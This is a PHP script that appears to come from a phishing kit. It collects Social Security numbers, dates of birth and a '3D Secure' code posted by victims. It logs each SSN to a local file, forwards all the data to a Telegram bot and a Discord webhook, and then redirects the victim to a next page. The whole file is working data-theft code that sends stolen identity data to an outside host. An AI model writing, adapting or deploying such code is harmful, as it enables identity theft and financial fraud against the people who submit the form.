<?php
include 'admin/config.php';
require 'results/geo.php';
$chatId = trim(file_get_contents("admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("admin/config/botUrl.ini"));
$telegram = trim(file_get_contents("admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("admin/config/status_discord.ini"));
$webhookUrl = trim(file_get_contents("admin/config/discord.ini"));
extract($_REQUEST);

# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)

$security = $_POST["thd"];
$SSN = $_POST["ssn"];
$BDM = $_POST["dob_month"];
$BDD = $_POST["dob_day"];
$BDY = $_POST["dob_year"];


$file1 = fopen("results/ssn.txt", "a");
fwrite($file1, $SSN);
fwrite($file1, "\n");
fclose($file1);



# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)

$data = "< P I N  &  S S N > >🆔\n > 3D Secure: $security \n  > SSN: $SSN \n  > Birthdate: $BDM / $BDD / $BDY \n ";

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

// Discord send function
if ($discord == "on"){
    $web_discord = $webhookUrl; 
    $json_data = array ('content'=>"$txt");
    $make_json = json_encode($json_data);
    $ch = curl_init( $web_discord );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}

header("location: main4.php");
